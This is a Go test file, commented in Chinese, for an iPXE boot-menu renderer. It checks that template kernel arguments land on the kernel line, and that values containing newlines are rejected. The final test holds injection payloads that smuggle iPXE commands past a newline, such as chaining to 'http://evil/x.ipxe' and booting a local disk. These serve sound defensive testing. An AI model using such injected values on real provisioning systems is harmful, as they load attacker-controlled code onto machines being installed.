// 本文件测试 Template.KernelArgs 接进 iPXE 菜单这条路径。
//
// **这个字段此前定义了但全仓没有任何渲染代码读它。** model.Template 有
// KernelArgs、API 收得进来（templateWriteRequest）、store 落了库
// （kernel_args 列）、契约文档也冻结了它，然后渲染器一行都不读——运维填了
// 内核参数，装机时完全不生效，而且没有任何地方报错或提示。
//
// 它的用途正是「同一份 ISO 派生多个模板」这个模型里最需要的那块灵活性：
// 制品集固定（一个 ISO），而串口重定向、显卡驱动黑名单、网卡命名策略、
// 安装器调试开关这些都是内核命令行上的事，不同机型/不同用途要填不同的值。
package render

import (
	"strings"
	"testing"

	"github.com/lober/lober/internal/core/model"
)

// TestRenderMenu_KernelArgsAppended 锁住模板声明的内核参数出现在 kernel 行。
func TestRenderMenu_KernelArgsAppended(t *testing.T) {
	for _, tc := range []struct {
		family model.OSFamily
		ctx    func() model.RenderContext
	}{
		{model.OSFamilyRHEL, menuCtxRHEL},
		{model.OSFamilyDebian, menuCtxDebian},
		{model.OSFamilyUbuntu, menuCtxUbuntu},
		{model.OSFamilySUSE, menuCtxSUSE},
	} {
		ctx := tc.ctx()
		ctx.Template.KernelArgs = "console=ttyS0,115200n8 net.ifnames=0"

		got, err := RenderMenu(ctx)
		if err != nil {
			t.Errorf("%s: RenderMenu 失败: %v", tc.family, err)
			continue
		}
		for _, want := range []string{"console=ttyS0,115200n8", "net.ifnames=0"} {
			if !strings.Contains(got, want) {
				t.Errorf("%s: 菜单里找不到模板声明的内核参数 %q——运维填了不生效，"+
					"且没有任何地方报错。完整菜单:\n%s", tc.family, want, got)
			}
		}
	}
}

// TestRenderMenu_KernelArgsOnKernelLineNotAfterBoot 锁住参数追加在 kernel
// 行内，而不是落到 initrd 行或 boot 之后。
//
// iPXE 的 kernel 命令把同一行余下的内容全部当成内核命令行；写到别处不是
// 「位置不好」而是彻底无效——落在 initrd 行会被当成 initrd 的参数，落在
// boot 之后则是一条独立的（不存在的）iPXE 命令。
func TestRenderMenu_KernelArgsOnKernelLineNotAfterBoot(t *testing.T) {
	ctx := menuCtxRHEL()
	ctx.Template.KernelArgs = "MARKER_ARG=1"

	got, err := RenderMenu(ctx)
	if err != nil {
		t.Fatalf("RenderMenu 失败: %v", err)
	}
	idxMarker := strings.Index(got, "MARKER_ARG=1")
	idxInitrd := strings.Index(got, "initrd ")
	if idxMarker == -1 {
		t.Fatalf("菜单里没有 MARKER_ARG=1:\n%s", got)
	}
	if idxMarker > idxInitrd {
		t.Errorf("内核参数落在 initrd 行之后——iPXE 只把 kernel 行余下的内容"+
			"当成内核命令行，写在别处彻底无效。完整菜单:\n%s", got)
	}
}

// TestRenderMenu_EmptyKernelArgsUnchanged 回归保护：KernelArgs 为空时输出
// 与接线之前一致（三份 menu golden 覆盖的就是这条路径）。
func TestRenderMenu_EmptyKernelArgsUnchanged(t *testing.T) {
	for _, tc := range []struct {
		family model.OSFamily
		ctx    func() model.RenderContext
	}{
		{model.OSFamilyRHEL, menuCtxRHEL},
		{model.OSFamilyDebian, menuCtxDebian},
		{model.OSFamilyUbuntu, menuCtxUbuntu},
		{model.OSFamilySUSE, menuCtxSUSE},
	} {
		ctx := tc.ctx()
		ctx.Template.KernelArgs = ""

		got, err := RenderMenu(ctx)
		if err != nil {
			t.Errorf("%s: RenderMenu 失败: %v", tc.family, err)
			continue
		}
		// 不留多余空格：`inst.text ip=dhcp ` 这种尾随空格虽然 iPXE 能容忍，
		// 但会让 golden 比对变脆，也让人怀疑是不是漏了什么。
		for _, line := range strings.Split(got, "\n") {
			if line != strings.TrimRight(line, " ") {
				t.Errorf("%s: 有行带尾随空格 %q——KernelArgs 为空时不应留下拼接痕迹",
					tc.family, line)
			}
		}
	}
}

// TestRenderMenu_KernelArgsRejectsNewline 锁住换行被拒。
//
// 这是本文件唯一的安全断言。内核命令行与 inst.ks= 在同一行，一个换行就能
// 结束 kernel 命令并注入任意 iPXE 命令——而 iPXE 脚本里可以 chain 到任意
// URL、可以 sanboot 本地盘。模板由 admin 编写（§9.4 需代码评审级权限），
// 但「需要评审的权限」不等于「可以跳过校验」：评审看的是意图，校验挡的是
// 手误与被篡改的模板内容。
func TestRenderMenu_KernelArgsRejectsNewline(t *testing.T) {
	for _, bad := range []string{
		"ok=1\nchain http://evil/x.ipxe",
		"ok=1\r\nsanboot --drive 0x80",
		"ok=1\rkernel http://evil/vmlinuz",
	} {
		ctx := menuCtxRHEL()
		ctx.Template.KernelArgs = bad

		if _, err := RenderMenu(ctx); err == nil {
			t.Errorf("KernelArgs=%q 含换行，必须拒绝渲染——换行能结束 kernel "+
				"命令并注入任意 iPXE 命令（chain 到任意 URL、sanboot 本地盘）", bad)
		}
	}
}
